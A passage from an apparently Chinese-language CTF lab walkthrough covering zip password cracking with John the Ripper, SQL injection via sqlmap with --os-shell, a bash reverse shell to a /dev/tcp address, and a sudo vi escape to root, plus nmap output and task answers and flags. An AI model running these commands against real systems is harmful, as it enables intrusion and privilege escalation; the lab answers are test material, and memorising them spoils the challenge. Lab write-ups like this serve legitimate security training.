class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs tap">ftp&gt; ls<br>229 Entering Extended Passive Mode (|||10202|)<br>150 Here comes the directory listing.<br>-rwxr-xr-x   <span class="hljs-number"> 1 </span>0       <span class="hljs-number"> 0 </span>          <span class="hljs-number"> 2533 </span>Apr<span class="hljs-number"> 13 </span><span class="hljs-number"> 2021 </span>backup.zip<br>226 Directory send OK.<br></code></pre></td></tr></table></figure><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">name</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">file</span> downloaded <span class="hljs-keyword">over</span> this service?<br>:backup.zip<br></code></pre></td></tr></table></figure><h3 id="Task-4-7"><a href="#Task-4-7" class="headerlink" title="Task 4"></a>Task 4</h3><p>使用 john  爆破</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">zip2john backup.zip &gt; crack<br><br>john -wordlist=<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt crack<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/8464f657edc85e83.png"></p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">What script comes <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> John The Ripper toolset <span class="hljs-keyword">and</span> generates <span class="hljs-keyword">a</span> hash <span class="hljs-built_in">from</span> <span class="hljs-keyword">a</span> password protected zip archive <span class="hljs-keyword">in</span> <span class="hljs-keyword">a</span> <span class="hljs-built_in">format</span> <span class="hljs-built_in">to</span> allow <span class="hljs-keyword">for</span> cracking attempts?<br>:zip2john<br></code></pre></td></tr></table></figure><h3 id="Task-5-7"><a href="#Task-5-7" class="headerlink" title="Task 5"></a>Task 5</h3><p>解压 zip 文件</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dns">unzip backup.zip<br>密码:<span class="hljs-number">741852963</span><br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/981dbec569bd6475.png"></p><p>拿到用户名和密码</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">admin:</span>qwerty789<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/5837ad06765b5e8c.png"></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">What <span class="hljs-keyword">is</span> the <span class="hljs-keyword">password</span> <span class="hljs-keyword">for</span> the <span class="hljs-keyword">admin</span> <span class="hljs-keyword">user</span> <span class="hljs-keyword">on</span> the website?<br>:qwerty789<br></code></pre></td></tr></table></figure><h3 id="Task-6-7"><a href="#Task-6-7" class="headerlink" title="Task 6"></a>Task 6</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vim">What option can <span class="hljs-keyword">be</span> passed <span class="hljs-keyword">to</span> sqlmap <span class="hljs-keyword">to</span> <span class="hljs-keyword">try</span> <span class="hljs-keyword">to</span> <span class="hljs-built_in">get</span> <span class="hljs-keyword">command</span> execution via the sql injection?<br>:--os-<span class="hljs-keyword">shell</span><br></code></pre></td></tr></table></figure><h3 id="Task-7-7"><a href="#Task-7-7" class="headerlink" title="Task 7"></a>Task 7</h3><p>进入网站发现存在 sql 注入点，sqlmap 跑一下，跑的超级慢</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">python sqlmap.py -u http://<span class="hljs-number">10</span>.<span class="hljs-number">129</span>.<span class="hljs-number">34</span>.<span class="hljs-number">175</span>/dashboard.php?search=Pico --cookie=&quot;PHPSESSID=<span class="hljs-number">9</span>ak49pbfau0kfkh436vo92tft0&quot; --os-shell --batch<br></code></pre></td></tr></table></figure><p>反弹一个 shell 去监听</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">bash -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;bash -i &amp;&gt; /dev/tcp/10.10.16.36/1234 0&gt;&amp;1&quot;</span><br></code></pre></td></tr></table></figure><p>然后在 <code>/var/www/html</code> 目录下的 <code>dashboard.php</code> 中找到密码 <code>P@s5w0rd!</code></p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">postgres:<span class="hljs-symbol">P@</span>s5w0rd!<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/ebc018fcbb5f0b51.png"></p><p>可以看见 <code>(ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf</code>，说明可以以 root 运行 <code>vi</code></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">What program can the postgres <span class="hljs-keyword">user</span> <span class="hljs-title">run</span> as root using sudo?<br>:vi<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-9"><a href="#Submit-Flag-9" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p><img src="https://img.dkdun.cn/v1/2025/12/bf7f08bde67594a7.png"></p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">Submit <span class="hljs-keyword">user</span> <span class="hljs-title">flag</span><br>:ec9b13ca4d6229cd5cc1e09980965bf7<br></code></pre></td></tr></table></figure><h3 id="Submit-Flag-10"><a href="#Submit-Flag-10" class="headerlink" title="Submit Flag"></a>Submit Flag</h3><p>执行以 root 权限打开 vi</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">sudo /bin/vi /etc/postgresql/<span class="hljs-number">11</span>/main/pg_hba.conf<br></code></pre></td></tr></table></figure><p>之后输入</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">:!<span class="hljs-regexp">/bin/</span>sh<br></code></pre></td></tr></table></figure><p>因为在 vi 的命令模式下，输入 <code>!</code> 代表强制执行，比如输入的 <code>!/bin/sh</code>，就代表以 shell 执行 <code>/bin/sh</code> </p><p>然后就成功提升到 root 权限</p><p><img src="https://img.dkdun.cn/v1/2025/12/cab4adb88af9b153.png"></p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-keyword">Submit</span> root flag<br>:dd6e058e814260bc70e9bbdef2715849<br></code></pre></td></tr></table></figure><h2 id="Unified"><a href="#Unified" class="headerlink" title="Unified"></a>Unified</h2><h3 id="Task-1-8"><a href="#Task-1-8" class="headerlink" title="Task 1"></a>Task 1</h3><figure class="highlight wren"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs wren"> <span class="hljs-variable">nmap</span> <span class="hljs-operator">-</span><span class="hljs-variable">sS</span> <span class="hljs-operator">-</span><span class="hljs-variable">sV</span> <span class="hljs-number">10.129</span><span class="hljs-number">.119</span><span class="hljs-number">.72</span><br><span class="hljs-title class_">Starting</span> <span class="hljs-title class_">Nmap</span> <span class="hljs-number">7.94</span>SVN ( <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org ) at 2025-03-05 19:38 CST</span><br><span class="hljs-title class_">Nmap</span> <span class="hljs-variable">scan</span> <span class="hljs-variable">report</span> <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span><span class="hljs-number">.119</span><span class="hljs-number">.72</span><br><span class="hljs-title class_">Host</span> <span class="hljs-operator">is</span> <span class="hljs-title function_">up</span> (<span class="hljs-number">0.43</span>s <span class="hljs-variable">latency</span>).<br><span class="hljs-title class_">Not</span> <span class="hljs-variable">shown</span>: <span class="hljs-number">996</span> <span class="hljs-variable">closed</span> <span class="hljs-variable">tcp</span> <span class="hljs-title function_">ports</span> (<span class="hljs-variable">reset</span>)<br><span class="hljs-variable">PORT</span>     <span class="hljs-variable">STATE</span> <span class="hljs-variable">SERVICE</span>         <span class="hljs-variable">VERSION</span><br><span class="hljs-number">22</span>/<span class="hljs-variable">tcp</span>   <span class="hljs-variable">open</span>  <span class="hljs-variable">ssh</span>             <span class="hljs-title class_">Open</span>SSH <span class="hljs-number">8.2</span>p1 <span class="hljs-title class_">Ubuntu</span> <span class="hljs-number">4</span>ubuntu0<span class="hljs-number">.3</span> (<span class="hljs-title class_">Ubuntu</span> <span class="hljs-title class_">Linux</span>; <span class="hljs-variable">protocol</span> <span class="hljs-number">2.0</span>)<br><span class="hljs-number">6789</span>/<span class="hljs-variable">tcp</span> <span class="hljs-variable">open</span>  <span class="hljs-variable">ibm</span><span class="hljs-operator">-</span><span class="hljs-variable">db2</span><span class="hljs-operator">-</span><span class="hljs-variable">admin?</span><br><span class="hljs-number">8080</span>/<span class="hljs-variable">tcp</span> <span class="hljs-variable">open</span>  <span class="hljs-variable">http</span><span class="hljs-operator">-</span><span class="hljs-variable">proxy</span><br><span class="hljs-number">8443</span>/<span class="hljs-variable">tcp</span> <span class="hljs-variable">open</span>  <span class="hljs-variable">ssl</span>/<span class="hljs-variable">nagios</span><span class="hljs-operator">-</span><span class="hljs-variable">nsca</span> <span class="hljs-title class_">Nagios</span> <span class="hljs-variable">NSCA</span><br><span class="hljs-number">1</span> <span class="hljs-variable">service</span> <span class="hljs-variable">unrecognized</span> <span class="hljs-variable">despite</span> returning <span class="hljs-variable">data</span>. <span class="hljs-title class_">If</span> <span class="hljs-variable">you</span> <span class="hljs-variable">know</span> <span class="hljs-variable">the</span> <span class="hljs-variable">service</span>/<span class="hljs-variable">version</span>, <span class="hljs-variable">please</span> <span class="hljs-variable">submit</span> <span class="hljs-variable">the</span> <span class="hljs-variable">following</span> <span class="hljs-variable">fingerprint</span> <span class="hljs-variable">at</span> <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org/cgi-bin/submit.cgi?new-service :</span><br><span class="hljs-variable">SF</span><span class="hljs-operator">-</span><span class="hljs-title class_">Port</span>8080<span class="hljs-operator">-</span><span class="hljs-variable">TCP</span>:<span class="hljs-variable">V</span><span class="hljs-operator">=</span><span class="hljs-number">7.94</span>SVN<span class="hljs-operator">%</span><span class="hljs-variable">I</span><span class="hljs-operator">=</span><span class="hljs-number">7</span><span class="hljs-operator">%</span><span class="hljs-variable">D</span><span class="hljs-operator">=</span><span class="hljs-number">3</span>/<span class="hljs-number">5</span><span class="hljs-operator">%</span><span class="hljs-title class_">Time</span><span class="hljs-operator">=</span><span class="hljs-number">67</span>C837E3<span class="hljs-operator">%</span><span class="hljs-variable">P</span><span class="hljs-operator">=</span><span class="hljs-variable">x86_64</span><span class="hljs-operator">-</span><span class="hljs-variable">pc</span><span class="hljs-operator">-</span><span class="hljs-variable">linux</span><span class="hljs-operator">-</span><span class="hljs-variable">gnu</span><span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<br><span class="hljs-variable">SF</span>:<span class="hljs-title class_">GetRequest</span>,<span class="hljs-number">84</span>,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>302<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Location:<span class="hljs-char escape_">\x20</span>http://localhost:80</span><br><span class="hljs-string">SF:80/manage<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>0<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Wed,<span class="hljs-char escape_">\x20</span>05<span class="hljs-char escape_">\x20</span>Mar<span class="hljs-char escape_">\x20</span>2025</span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>11:39:15<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">HTTPOptions</span>,<span class="hljs-number">84</span>,<br><span class="hljs-variable">SF</span>:<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>302<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Location:<span class="hljs-char escape_">\x20</span>http://localhost:8080/manage<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>C</span><br><span class="hljs-string">SF:ontent-Length:<span class="hljs-char escape_">\x20</span>0<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Wed,<span class="hljs-char escape_">\x20</span>05<span class="hljs-char escape_">\x20</span>Mar<span class="hljs-char escape_">\x20</span>2025<span class="hljs-char escape_">\x20</span>11:39:16\x</span><br><span class="hljs-string">SF:20GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">RTSPRequest</span>,<span class="hljs-number">24</span>E,<span class="hljs-string">&quot;HTTP/1\.1\x2</span><br><span class="hljs-string">SF:0400<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Type:<span class="hljs-char escape_">\x20</span>text/html;charset=utf-8<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Languag</span><br><span class="hljs-string">SF:e:<span class="hljs-char escape_">\x20</span>en<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>435<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Wed,<span class="hljs-char escape_">\x20</span>05<span class="hljs-char escape_">\x20</span>Mar<span class="hljs-char escape_">\x20</span>202</span><br><span class="hljs-string">SF:5<span class="hljs-char escape_">\x20</span>11:39:19<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&lt;!doctype<span class="hljs-char escape_">\x20</span>html&gt;&lt;</span><br><span class="hljs-string">SF:html<span class="hljs-char escape_">\x20</span>lang=<span class="hljs-char escape_">\&quot;</span>en<span class="hljs-char escape_">\&quot;</span>&gt;&lt;head&gt;&lt;title&gt;HTTP<span class="hljs-char escape_">\x20</span>Status<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span>\xe2<span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x93</span>\</span><br><span class="hljs-string">SF:x20Bad<span class="hljs-char escape_">\x20</span>Request&lt;/title&gt;&lt;style<span class="hljs-char escape_">\x20</span>type=<span class="hljs-char escape_">\&quot;</span>text/css<span class="hljs-char escape_">\&quot;</span>&gt;body<span class="hljs-char escape_">\x20</span>&#123;font-fami</span><br><span class="hljs-string">SF:ly:Tahoma,Arial,sans-serif;&#125;<span class="hljs-char escape_">\x20</span>h1,<span class="hljs-char escape_">\x20</span>h2,<span class="hljs-char escape_">\x20</span>h3,<span class="hljs-char escape_">\x20</span>b<span class="hljs-char escape_">\x20</span>&#123;color:white;</span><br><span class="hljs-string">SF:background-color:#525D76;&#125;<span class="hljs-char escape_">\x20</span>h1<span class="hljs-char escape_">\x20</span>&#123;font-size:22px;&#125;<span class="hljs-char escape_">\x20</span>h2<span class="hljs-char escape_">\x20</span>&#123;font-si</span><br><span class="hljs-string">SF:ze:16px;&#125;<span class="hljs-char escape_">\x20</span>h3<span class="hljs-char escape_">\x20</span>&#123;font-size:14px;&#125;<span class="hljs-char escape_">\x20</span>p<span class="hljs-char escape_">\x20</span>&#123;font-size:12px;&#125;<span class="hljs-char escape_">\x20</span>a<span class="hljs-char escape_">\x20</span></span><br><span class="hljs-string">SF:&#123;color:black;&#125;<span class="hljs-char escape_">\x20</span>\.line<span class="hljs-char escape_">\x20</span>&#123;height:1px;background-color:#525D76;border</span><br><span class="hljs-string">SF::none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP<span class="hljs-char escape_">\x20</span>Status<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span>\xe2<span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x93</span>\x</span><br><span class="hljs-string">SF:20Bad<span class="hljs-char escape_">\x20</span>Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">FourOhFourRequest</span>,<span class="hljs-number">24</span>A,<span class="hljs-string">&quot;HTTP/1\.</span><br><span class="hljs-string">SF:1<span class="hljs-char escape_">\x20</span>404<span class="hljs-char escape_">\x20</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Type:<span class="hljs-char escape_">\x20</span>text/html;charset=utf-8<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Lan</span><br><span class="hljs-string">SF:guage:<span class="hljs-char escape_">\x20</span>en<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>431<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Wed,<span class="hljs-char escape_">\x20</span>05<span class="hljs-char escape_">\x20</span>Mar\x2</span><br><span class="hljs-string">SF:02025<span class="hljs-char escape_">\x20</span>11:39:22<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&lt;!doctype<span class="hljs-char escape_">\x20</span>ht</span><br><span class="hljs-string">SF:ml&gt;&lt;html<span class="hljs-char escape_">\x20</span>lang=<span class="hljs-char escape_">\&quot;</span>en<span class="hljs-char escape_">\&quot;</span>&gt;&lt;head&gt;&lt;title&gt;HTTP<span class="hljs-char escape_">\x20</span>Status<span class="hljs-char escape_">\x20</span>404<span class="hljs-char escape_">\x20</span>\xe2<span class="hljs-char escape_">\x80</span>\</span><br><span class="hljs-string">SF:x93<span class="hljs-char escape_">\x20</span>Not<span class="hljs-char escape_">\x20</span>Found&lt;/title&gt;&lt;style<span class="hljs-char escape_">\x20</span>type=<span class="hljs-char escape_">\&quot;</span>text/css<span class="hljs-char escape_">\&quot;</span>&gt;body<span class="hljs-char escape_">\x20</span>&#123;font-fa</span><br><span class="hljs-string">SF:mily:Tahoma,Arial,sans-serif;&#125;<span class="hljs-char escape_">\x20</span>h1,<span class="hljs-char escape_">\x20</span>h2,<span class="hljs-char escape_">\x20</span>h3,<span class="hljs-char escape_">\x20</span>b<span class="hljs-char escape_">\x20</span>&#123;color:whit</span><br><span class="hljs-string">SF:e;background-color:#525D76;&#125;<span class="hljs-char escape_">\x20</span>h1<span class="hljs-char escape_">\x20</span>&#123;font-size:22px;&#125;<span class="hljs-char escape_">\x20</span>h2<span class="hljs-char escape_">\x20</span>&#123;font-</span><br><span class="hljs-string">SF:size:16px;&#125;<span class="hljs-char escape_">\x20</span>h3<span class="hljs-char escape_">\x20</span>&#123;font-size:14px;&#125;<span class="hljs-char escape_">\x20</span>p<span class="hljs-char escape_">\x20</span>&#123;font-size:12px;&#125;<span class="hljs-char escape_">\x20</span>a\x</span><br><span class="hljs-string">SF:20&#123;color:black;&#125;<span class="hljs-char escape_">\x20</span>\.line<span class="hljs-char escape_">\x20</span>&#123;height:1px;background-color:#525D76;bord</span><br><span class="hljs-string">SF:er:none;&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP<span class="hljs-char escape_">\x20</span>Status<span class="hljs-char escape_">\x20</span>404<span class="hljs-char escape_">\x20</span>\xe2<span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x93</span></span><br><span class="hljs-string">SF:<span class="hljs-char escape_">\x20</span>Not<span class="hljs-char escape_">\x20</span>Found&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>)<span class="hljs-operator">%</span><span class="hljs-title function_">r</span>(<span class="hljs-title class_">Socks</span>5,<span class="hljs-number">24</span>E,<span class="hljs-string">&quot;HTTP/1\.1<span class="hljs-char escape_">\x20</span>400\x2</span><br><span class="hljs-string">SF:0<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Type:<span class="hljs-char escape_">\x20</span>text/html;charset=utf-8<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Language:<span class="hljs-char escape_">\x20</span>e</span><br><span class="hljs-string">SF:n<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Content-Length:<span class="hljs-char escape_">\x20</span>435<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Date:<span class="hljs-char escape_">\x20</span>Wed,<span class="hljs-char escape_">\x20</span>05<span class="hljs-char escape_">\x20</span>Mar<span class="hljs-char escape_">\x20</span>2025<span class="hljs-char escape_">\x20</span>11</span><br><span class="hljs-string">SF::39:24<span class="hljs-char escape_">\x20</span>GMT<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>Connection:<span class="hljs-char escape_">\x20</span>close<span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span><span class="hljs-char escape_">\r</span><span class="hljs-char escape_">\n</span>&lt;!doctype<span class="hljs-char escape_">\x20</span>html&gt;&lt;html\x2</span><br><span class="hljs-string">SF:0lang=<span class="hljs-char escape_">\&quot;</span>en<span class="hljs-char escape_">\&quot;</span>&gt;&lt;head&gt;&lt;title&gt;HTTP<span class="hljs-char escape_">\x20</span>Status<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span>\xe2<span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x93</span><span class="hljs-char escape_">\x20</span>Bad\</span><br><span class="hljs-string">SF:x20Request&lt;/title&gt;&lt;style<span class="hljs-char escape_">\x20</span>type=<span class="hljs-char escape_">\&quot;</span>text/css<span class="hljs-char escape_">\&quot;</span>&gt;body<span class="hljs-char escape_">\x20</span>&#123;font-family:Taho</span><br><span class="hljs-string">SF:ma,Arial,sans-serif;&#125;<span class="hljs-char escape_">\x20</span>h1,<span class="hljs-char escape_">\x20</span>h2,<span class="hljs-char escape_">\x20</span>h3,<span class="hljs-char escape_">\x20</span>b<span class="hljs-char escape_">\x20</span>&#123;color:white;backgro</span><br><span class="hljs-string">SF:und-color:#525D76;&#125;<span class="hljs-char escape_">\x20</span>h1<span class="hljs-char escape_">\x20</span>&#123;font-size:22px;&#125;<span class="hljs-char escape_">\x20</span>h2<span class="hljs-char escape_">\x20</span>&#123;font-size:16px</span><br><span class="hljs-string">SF:;&#125;<span class="hljs-char escape_">\x20</span>h3<span class="hljs-char escape_">\x20</span>&#123;font-size:14px;&#125;<span class="hljs-char escape_">\x20</span>p<span class="hljs-char escape_">\x20</span>&#123;font-size:12px;&#125;<span class="hljs-char escape_">\x20</span>a<span class="hljs-char escape_">\x20</span>&#123;color:</span><br><span class="hljs-string">SF:black;&#125;<span class="hljs-char escape_">\x20</span>\.line<span class="hljs-char escape_">\x20</span>&#123;height:1px;background-color:#525D76;border:none;&#125;</span><br><span class="hljs-string">SF:&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP<span class="hljs-char escape_">\x20</span>Status<span class="hljs-char escape_">\x20</span>400<span class="hljs-char escape_">\x20</span>\xe2<span class="hljs-char escape_">\x80</span><span class="hljs-char escape_">\x93</span><span class="hljs-char escape_">\x20</span>Bad\x</span><br><span class="hljs-string">SF:20Request&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt;&quot;</span>);<br><span class="hljs-title class_">Service</span> <span class="hljs-title class_">Info</span>: <span class="hljs-variable">OS</span>: <span class="hljs-title class_">Linux</span>; <span class="hljs-variable">CPE</span>: <span class="hljs-variable">cpe</span>:/<span class="hljs-variable">o</span>:<span class="hljs-variable">linux</span>:<span class="hljs-variable">linux_kernel</span><br><br><span class="hljs-title class_">Service</span> <span class="hljs-variable">detection</span> <span class="hljs-variable">performed</span>. <span class="hljs-title class_">Please</span> <span class="hljs-variable">report</span> <span class="hljs-variable">any</span> incorrect <span class="hljs-variable">results</span> <span class="hljs-variable">at</span> <span class="hljs-variable">https</span>:<span class="hljs-comment">//nmap.org/submit/ .</span><br><span class="hljs-title class_">Nmap</span> <span class="hljs-variable">done</span>: <span class="hljs-number">1</span> <span class="hljs-variable">IP</span> <span class="hljs-title function_">address</span> (<span class="hljs-number">1</span> <span class="hljs-variable">host</span> <span class="hljs-variable">up</span>) <span class="hljs-variable">scanned</span> <span class="hljs-keyword">in</span> <span class="hljs-number">227.57</span> <span class="hljs-variable">seconds</span><br></code></pre></td></tr></table></figure><p>nmap 扫</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">Which are <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> <span class="hljs-literal">four</span> <span class="hljs-built_in">open</span> ports?<br>:<span class="hljs-number">22</span>,<span class="hljs-number">6789</span>,<span class="hljs-number">8080</span>,<span class="hljs-number">8443</span><br></code></pre></td></tr></table></figure><h3 id="Task-2-8"><a href="#Task-2-8" class="headerlink" title="Task 2"></a>Task 2</h3><p>访问 8080 端口会重定向到 8443 ，然后</p><p><img src="https://img.dkdun.cn/v1/2025/12/d632171ab4bebf55.png"></p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> title <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> software <span class="hljs-keyword">that</span> <span class="hljs-keyword">is</span> <span class="hljs-built_in">running</span> <span class="hljs-built_in">running</span> <span class="hljs-keyword">on</span> port <span class="hljs-number">8443</span>?<br>:UniFi Network<br></code></pre></td></tr></table></figure><h3 id="Task-3-8"><a href="#Task-3-8" class="headerlink" title="Task 3"></a>Task 3</h3><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs applescript">What <span class="hljs-keyword">is</span> <span class="hljs-keyword">the</span> <span class="hljs-built_in">version</span> <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> software <span class="hljs-keyword">that</span> <span class="hljs-keyword">is</span> <span class="hljs-built_in">running</span>?<br>:<span class="hljs-number">6.4</span><span class="hljs-number">.54</span><br></code></pre></td></tr></table></figure><h3 id="Task-4-8"><a href="#Task-4-8" class="headerlink" title="Task 4"></a>Task 4</h3><p>直接搜 UniFi Network 6.4.54 CVE</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-title class_">What</span> is the <span class="hljs-title class_">CVE</span> <span class="hljs-keyword">for</span> the identified vulnerability?<br><span class="hljs-symbol">:CVE-</span><span class="hljs-number">2021</span><span 